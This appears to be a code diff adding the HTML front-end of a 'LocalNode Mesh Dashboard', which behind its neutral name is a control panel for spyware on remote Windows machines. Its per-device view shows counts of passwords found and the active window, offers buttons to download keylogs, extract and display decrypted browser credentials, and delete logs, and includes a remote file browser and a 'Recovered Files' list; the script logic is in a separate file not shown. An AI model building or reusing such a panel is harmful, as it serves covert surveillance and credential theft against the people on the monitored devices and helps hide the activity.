@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LocalNode Mesh Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+
+    <!-- Auth Screen -->
+    <div id="auth-container" class="auth-overlay">
+        <div class="login-box">
+            <i class="fab fa-windows fa-3x" style="color: #0078d4; margin-bottom: 20px;"></i>
+            <h2>LocalNode Mesh</h2>
+            <input type="email" id="email" placeholder="Email">
+            <input type="password" id="password" placeholder="Password">
+            <button id="login-btn">Sign In</button>
+            <p id="error-msg" style="color: #ff4757; font-size: 12px; margin-top: 10px;"></p>
+        </div>
+    </div>
+
+    <!-- Main App -->
+    <div id="app-container" class="hidden">
+
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="brand">
+                <i class="fab fa-windows"></i> LocalNode
+            </div>
+
+            <div class="section-title">Devices</div>
+            <div id="device-list">
+                <div class="sidebar-item" style="font-style: italic; opacity: 0.7;">Scanning...</div>
+            </div>
+
+            <div class="section-title">Account</div>
+            <div class="sidebar-item" id="logout-btn">
+                <span class="sidebar-icon"><i class="fas fa-sign-out-alt"></i></span>
+                Logout
+            </div>
+        </div>
+
+        <!-- Main Content Area -->
+        <div class="main-content">
+
+            <!-- Default "No Selection" View -->
+            <div id="no-device-selected" class="center-message">
+                <i class="fas fa-desktop fa-3x" style="opacity: 0.3; margin-bottom: 20px;"></i>
+                <h2>Select a Device</h2>
+                <p>Choose a device from the sidebar to manage it.</p>
+            </div>
+
+            <!-- Specific Device View -->
+            <div id="device-view" class="hidden">
+
+                <!-- Header / Tabs -->
+                <div class="device-header">
+                    <div class="device-title">
+                        <i class="fas fa-desktop"></i> <span id="header-hostname">Hostname</span>
+                        <span id="header-ip" class="ip-badge">192.168.1.x</span>
+                    </div>
+
+                    <div class="tabs">
+                        <button class="tab-btn active" onclick="switchTab('overview')"><i
+                                class="fas fa-info-circle"></i> Overview</button>
+                        <button class="tab-btn" onclick="switchTab('files')"><i class="fas fa-folder"></i>
+                            Files</button>
+                        <button class="tab-btn" onclick="switchTab('downloads')"><i class="fas fa-download"></i>
+                            Downloads</button>
+                    </div>
+                </div>
+
+                <!-- Tab Content: Overview -->
+                <div id="tab-overview" class="tab-content active">
+
+                    <!-- System Info Cards -->
+                    <div class="info-grid">
+                        <div class="info-card">
+                            <div class="card-label">Operating System</div>
+                            <div class="card-value" id="info-os">-</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="card-label">CPU / RAM</div>
+                            <div class="card-value" id="info-ram">-</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="card-label">Active Window</div>
+                            <div class="card-value highlight" id="info-activity">-</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="card-label">Last Seen</div>
+                            <div class="card-value" id="info-lastseen">-</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="card-label">MAC Address</div>
+                            <div class="card-value" id="info-mac">-</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="card-label">Serial Number</div>
+                            <div class="card-value" id="info-serial">-</div>
+                        </div>
+
+                        <!-- New Stats -->
+                        <div class="info-card">
+                            <div class="card-label">Indexed Files</div>
+                            <div class="card-value" id="info-files">-</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="card-label">Passwords Found</div>
+                            <div class="card-value" id="info-passwords">-</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="card-label">Downloads/Uploads</div>
+                            <div class="card-value" id="info-downloads">-</div>
+                        </div>
+                    </div>
+
+                    <!-- Actions -->
+                    <div class="section-header"><i class="fas fa-bolt"></i> Remote Actions</div>
+                    <div class="action-grid">
+                        <button class="action-card" onclick="downloadKeylogs()">
+                            <i class="fas fa-keyboard"></i>
+                            <span>Download Keylogs</span>
+                        </button>
+                        <button class="action-card" onclick="extractBrowserData()">
+                            <i class="fas fa-globe"></i>
+                            <span>Extract Passwords</span>
+                        </button>
+                        <button class="action-card danger" onclick="deleteKeylogs()">
+                            <i class="fas fa-trash"></i>
+                            <span>Delete Logs</span>
+                        </button>
+                    </div>
+
+                    <!-- Browser Data Panel -->
+                    <div id="browser-data-panel" class="data-panel hidden">
+                        <div class="panel-header">
+                            <span><i class="fas fa-key"></i> Decrypted Credentials</span>
+                            <button class="icon-btn"
+                                onclick="document.getElementById('browser-data-panel').classList.add('hidden')"><i
+                                    class="fas fa-times"></i></button>
+                        </div>
+                        <div id="browser-data-content" class="panel-content"></div>
+                    </div>
+
+                </div>
+
+                <!-- Tab Content: Files -->
+                <div id="tab-files" class="tab-content">
+
+                    <div class="file-toolbar">
+                        <div class="breadcrumbs" id="breadcrumbs">
+                            <span class="crumb" onclick="renderFiles('')">This PC</span>
+                        </div>
+                        <button class="icon-btn" onclick="refreshFiles()" title="Refresh"><i
+                                class="fas fa-sync-alt"></i></button>
+                    </div>
+
+                    <div class="file-list-header">
+                        <div></div>
+                        <div>Name</div>
+                        <div>Size</div>
+                        <div>Type</div>
+                        <div>Action</div>
+                    </div>
+
+                    <div id="file-view" class="file-list">
+                        <!-- File Items Injected Here -->
+                    </div>
+                </div>
+
+                <!-- Tab Content: Downloads -->
+                <div id="tab-downloads" class="tab-content">
+                    <div class="section-header">Recovered Files</div>
+                    <div id="downloads-list" class="downloads-list">
+                        <div style="padding: 20px; opacity: 0.5;">No downloads yet.</div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script type="module" src="app.js"></script>
+</body>
+
+</html>
